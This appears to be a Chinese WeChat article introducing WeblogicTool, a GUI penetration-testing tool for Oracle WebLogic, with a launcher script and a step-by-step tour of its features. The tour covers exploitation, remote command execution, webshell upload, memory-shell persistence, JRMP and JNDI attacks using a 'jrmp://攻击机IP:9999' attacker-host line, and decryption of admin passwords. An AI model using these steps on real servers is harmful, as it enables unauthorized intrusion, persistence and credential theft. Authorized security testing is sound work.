---
title: 针对 Oracle WebLogic 中间件的一体化渗透测试工具：WeblogicTool
url: https://mp.weixin.qq.com/s/vTpN074Y4XBnRCrQXk8dhA
source: Doonsec's feed
date: 2026-01-15
fetch_date: 2026-01-16T03:27:24.877438
---

# 针对 Oracle WebLogic 中间件的一体化渗透测试工具：WeblogicTool

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2p5XLDMm9GHbyDSUqnk1PLDeCSvVwCyU5ogvLXPw0MmRhsicLNo9nhqvg/0?wx_fmt=jpeg)

# 针对 Oracle WebLogic 中间件的一体化渗透测试工具：WeblogicTool

原创

网安武器库
网安武器库

网安武器库

![]()

在小说阅读器中沉浸阅读

**更多干货  点击蓝字 关注我们**

**注：本文仅供学习，坚决反对一切危害网络安全的行为。造成法律后果自行负责！**

**往期回顾**

·[SpringBoot-Scan：针对Spring Boot的漏洞扫描和渗透工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247485898&idx=1&sn=e1eb04e1d90f09ea5cfa447fac6ad66a&scene=21#wechat_redirect)

·[Burp插件-BurpFingerPrint:被动指纹识别与弱口令爆破](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247485896&idx=1&sn=ca895f451df48ff7e310794c1eee3627&scene=21#wechat_redirect)

·[ANDRAX：一款强大的Android智能手机渗透测试平台](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247485870&idx=1&sn=43339f93a01271dc201eee9e174be4ad&scene=21#wechat_redirect)

·[WLAN爆破神器aircrack-ng：WIFI快速密码爆破工具](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247485855&idx=1&sn=60708f498fed71a1cea55d36bbb8bed5&scene=21#wechat_redirect)

·[Burpsuite插件：autorize实现抓包实时越权漏洞检测](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247485847&idx=1&sn=727a77f7e2c484c9abdcb773b263b438&scene=21#wechat_redirect)

·[Tor浏览器：匿名浏览器实现网络IP隐身](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247485793&idx=1&sn=fde90afa005a931568a23c5d36e29882&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**介绍**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pK6QYdKzKIjFN8kfibUmHWP5FniaQr04yaN1ceb2UKqqiaiaksQpULnJQwA/640?wx_fmt=png&from=appmsg)

      WeblogicTool 是一款针对于 Oracle WebLogic 中间件的一体化渗透测试专用工具，集成 WebLogic 全版本漏洞检测、利用、权限提升及漏洞修复核查能力，覆盖反序列化、弱口令、控制台未授权访问、JNDI 注入等核心高危漏洞利用链，工具基于 Java 开发跨平台适配性强，可精准探测目标 WebLogic 服务漏洞指纹，提供自动化漏洞验证与利用能力，是渗透测试中针对 WebLogic 中间件的核心审计工具。

     该工具轻量化部署且无环境依赖冗余，内置完整的漏洞利用 Payload 与 POC 集合，支持漏洞一键检测、漏洞利用会话交互、权限校验绕过等核心渗透功能，可高效完成 WebLogic 中间件的安全合规检测与渗透验证，适配内网渗透、外网打点等多场景测试需求，是安全从业者开展 WebLogic 中间件渗透测试与安全加固的必备工具。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**演示**

在github网址

```
https://github.com/KimJun1010/WeblogicTool/releases/tag/v1.3
```

上面下载jar包，提前安装好java以及javafx，我用的是11.0.2

之后在jar包目录里创建文本文档start.txt

输入

```
@echo offtitle WeblogicTool_1.3 启动脚本(Java11+JavaFX适配)color 0aecho 正在启动WeblogicTool工具，请勿关闭窗口...echo ==============================cd /d "%~dp0"java --module-path "D:\Java\javafx-sdk-11.0.2\lib" --add-modules javafx.controls,javafx.fxml,javafx.base,javafx.graphics -jar WeblogicTool_1.3.jarpause
```

"D:\Java\javafx-sdk-11.0.2\lib"部分改为你javafx的lib文件夹的真实路径

之后保存并重命名成start.bat

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pQ98KHY3DUvwNp4zMibg3hj3GDn1r6VNWGyxBgNrzZjZoMGE685WIAGQ/640?wx_fmt=png&from=appmsg)

之后就可以通过双击bat文件打开而不会出现闪退的情况

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pJK6xqCtxG8icwzGZ5lwkicDe1Wl6AFicTW6VpIMoiacU7UZsDddbWdEibhg/640?wx_fmt=png&from=appmsg)

打开是这样的

信息：

顶部输入框填写目标 WebLogic 服务器 IP与目标服务端口（WebLogic 默认管理端口 7001，漏洞探测端口同）

点击检测

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2po4DGjZrw96xichapSGGLNFJRQIPn5SmkOcSAjRxjTBM1uU1qe1FHqIQ/640?wx_fmt=png&from=appmsg)

漏洞检测完成后，界面会列出目标存在的高危漏洞详情，是否存在某CVE等，如 CVE 编号、漏洞类型、风险等级。

选中对应漏洞条目，点击【利用】按钮，工具将自动加载适配的 POC/EXP 完成漏洞验证与利用。

命令执行：

漏洞利用成功后，切换至命令执行标签页，输入系统命令（如whoami），点击执行即可获取目标服务器的命令回显。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2piabic8YJMLpiciaZbZu4LG8UH1O2JxflMqBxiafemqGBUCric1Rf4Vu2JIqQ/640?wx_fmt=png&from=appmsg)

shell上传：

点击「选择文件」上传 WebShell 脚本（如 jsp 格式），指定上传路径后点击上传，完成后可通过 WebShell 连接目标。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pWyoz2NwpdsJYCsOficibpz1zAITI0Yv3f5RATAibmxjqETQ2icfMINxRQQ/640?wx_fmt=png&from=appmsg)

内存马注入：

在该标签页选择内存马类型（如 JSP 内存马），填写注入路径，点击注入后，可通过对应路径访问内存马，实现无文件落地的权限维持。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pzrgugYnEzn5mjy265VMicBzeibJETgnglRvEWz0J2AiceCFoYRxLBuodw/640?wx_fmt=png&from=appmsg)

JRMP攻击

在攻击机（如 Kali）启动 JRMP 服务，再在工具中填写

```
jrmp://攻击机IP:9999
```

点击「执行」，利用目标反序列化漏洞触发 JRMP 服务中的 Payload（如弹出计算器）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pZVYhz8Ygcu9XtXZ2NYicYvBaPXCQwfTQq03vrpx28qs3g1LuwHLVS9g/640?wx_fmt=png&from=appmsg)

JNDI攻击：

填写 JNDI 服务地址（需提前在攻击机启动 JNDI 服务），点击执行，利用目标 JNDI 注入漏洞加载恶意类，实现远程代码执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2poyWZw8q0vJdIBcQQTS8Pl19DSOtnhfibQvaWib1u9iaymxl8v8uF7tA3w/640?wx_fmt=png&from=appmsg)

密码解密：

上传目标 WebLogic 的boot.properties配置文件，点击解密，可获取 WebLogic 管理员账号的明文密码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2pPUf2dum0IdNAfGicthM3smiaIzCTicpP7V4JAaWJL6LX7b3iapKPkE0fmQ/640?wx_fmt=png&from=appmsg)

协议探测

点击该标签页的「探测」按钮，自动识别目标 WebLogic 开放的协议端口（如 T3、IIOP），辅助漏洞利用的协议适配。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uj6evIMQUATq5ok37Ytus2prkNpcSnfzJXlohxiaLKwuMn6vDfh6dN34BtWlOeAc9QyFb5b73Cu2kw/640?wx_fmt=png&from=appmsg)

github地址：

```
https://github.com/KimJun1010/WeblogicTool/releases/tag/v1.3
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eRUtCzBCFbaMYy1c7utlweibCFXWsicmm9ebyvInBtdsD0QRlUDTdLib1g/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

网安武器库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过